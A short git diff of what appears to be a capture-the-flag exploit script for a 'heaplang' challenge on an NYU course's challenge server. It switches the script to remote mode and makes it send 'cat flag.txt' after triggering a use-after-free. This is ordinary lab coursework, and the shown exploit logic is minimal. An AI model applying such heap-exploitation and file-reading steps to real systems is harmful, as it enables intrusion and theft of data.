@@ -13,11 +13,11 @@ host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
 port = 1345
 netid='pk1898'
 
-do_remote = False
+do_remote = True
 binary_name = './heaplang'
 
 #for doing local debugging
-is_local_dbg = True
+is_local_dbg = False
 gdb_script = '''
 set pagination off
 set disassembly-flavor intel
@@ -173,10 +173,10 @@ def solve(target):
     #stage_1_do_some_stuff(target)
     stage_02_trigger_uaf(target)
 
-    target.interactive()
-    # print target.readline()
-    # target.sendline('cat flag.txt')
-    # return target.readline()
+    # target.interactive()
+    print target.readline()
+    target.sendline('cat flag.txt')
+    return target.readline()
 
 
 #universal target setup for remote-only
